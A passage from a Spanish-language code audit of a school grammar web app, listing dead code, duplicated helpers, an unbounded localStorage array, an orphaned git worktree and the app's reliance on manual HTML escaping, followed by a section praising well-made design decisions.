// Silencia el ruido de depuración en producción sin tener que borrar 77 llamadas.
// En local (localhost / 127.0.0.1) se ve todo; publicado, solo warn y error —
// así los console.error del guardián de arranque siguen saliendo.
const _dev = /^(localhost|127\.0\.0\.1|\[::1\])$/.test(location.hostname);
export const log = {
  debug: _dev ? console.log.bind(console)  : () => {},
  info:  _dev ? console.info.bind(console) : () => {},
  warn:  console.warn.bind(console),
  error: console.error.bind(console),
};
```

---

## M2 · Código muerto: 422 líneas + un bloque inactivo

| Archivo | Líneas | Estado |
|---|---|---|
| `js/modules/_legacy/morph/index.js` | 342 | Sin ninguna referencia en todo el repo |
| `server/_legacy_enviar_alumnos_gemini.gs` | 80 | Reemplazado por `EnviarInformes.gs` |
| `js/modules/compuestas/index.js:3665` `redactarAnalisis()` | ~120 | Inactivo desde 2026-05-27, documentado |

Los dos primeros pueden borrarse: el historial de git los conserva. **El tercero NO se
toca** — está deliberadamente conservado con una justificación explícita en el código;
es una decisión legítima, no deuda.

---

## M3 · Duplicación (DRY)

- `escCSV` definida **dos veces en el mismo archivo**: `js/modules/teacher/index.js:892`
  y `:1170` → resuelto en **C5** (extraer a `core/escape.js`).
- `_el(id)` idéntica en `js/modules/fabrica/index.js:208` y
  `js/modules/laboratorio/index.js:309` → a `core/`.
- El patrón de analíticas por `sendBeacon` repetido casi literal en tres módulos:
  `js/modules/chispa/index.js:541`, `js/modules/sintagmas/index.js:424`,
  `js/modules/laboratorio/index.js:1823`.

Un `js/core/analitica.js` con `enviarSesion(action, datos)` los unifica — y evita que
el próximo módulo repita el bug de `sendBeacon` sin cuerpo que ya se tragó meses de
datos (documentado en `server/Code_v6.gs:2636`).

---

## M4 · Museo sin poda

**Archivo:** `js/modules/fabrica/index.js:966` (`fabCreativoGuardar`)

`museo.push(...)` sin límite. Un alumno constante acumula cientos de entradas en
`localStorage` (cuota total ~5 MB compartida con el resto de claves). No es urgente,
pero un tope evita que la Fábrica acabe desalojando el progreso de otros módulos.

```javascript
const MUSEO_MAX = 200;  // tope suave: el museo es una vitrina, no un archivo
museo.push({ /* ... */ });
if (museo.length > MUSEO_MAX) museo.splice(0, museo.length - MUSEO_MAX);
_saveMuseo(museo);
```

---

## M5 · Worktree huérfano en el repositorio

`.claude/worktrees/cool-elbakyan-bd7562` — 8,8 MB, copia completa del proyecto en `HEAD`
desasociado, último commit del 17-ago-2026. Está en `.gitignore`, así que no ensucia el
repo, pero **confunde las búsquedas locales** (los `grep` devuelven todo por duplicado)
y puede llevar a editar el archivo equivocado.

```bash
git worktree remove .claude/worktrees/cool-elbakyan-bd7562
```

---

## M6 · CSP imposible por diseño (informativo, no accionable)

`index.html` tiene 170 manejadores en línea (116 `onclick`, 40 `onchange`, 9
`onkeydown`, 5 `oninput`) y varios `<script>` en línea. Eso hace inviable una
`Content-Security-Policy` sin `unsafe-inline`, que es tanto como no tenerla.

Es una consecuencia asumida de la arquitectura sin build, coherente con las reglas del
proyecto — **no lo cambies**. Queda anotado porque significa que el escapado manual
(`escHtml`) es la única defensa contra XSS que tiene esta app, y eso eleva la
importancia de **A4**.

---

# Lo que está bien

No todo son hallazgos, y conviene dejarlo escrito porque marca dónde **no** hay que tocar:

- **El guardián de arranque** (`index.html:1530`): solución elegante y correcta a un
  fallo real. Script en línea que no puede fallar por lo mismo que vigila, captura en
  fase de captura, margen de 1,5 s tras `load`.
- **`precacheShell`** (`sw.js:106`) con `cache.put` archivo a archivo en vez de
  `addAll`, con el incidente que lo motivó documentado en el propio código. Es
  exactamente la decisión correcta.
- **Uso de `textContent` para el nombre del alumno** (`sint/index.js:1640` y `:2974`).
  El panel del profesor escapa todos los nombres y correos con `escHtml`. Los módulos
  `compuestas`, `fabrica` y `laboratorio` escapan de forma sistemática.
- **`buildOracionObject`** (`server/Code_v6.gs:343`) es genuinamente robusto ante datos
  malformados: normaliza `null`, tolera JSON roto, y su cascada de cuatro estrategias
  para enclíticos degrada limpiamente en vez de lanzar.
- **Los comentarios que explican el *porqué*** de decisiones contraintuitivas (el cambio
  de *stale-while-revalidate* a *network-first*; el bug de `sendBeacon` sin cuerpo).
  Documentación de la buena.

---

*Auditoría realizada el 28-ago-2026 sobre el commit `40c6da3`.*
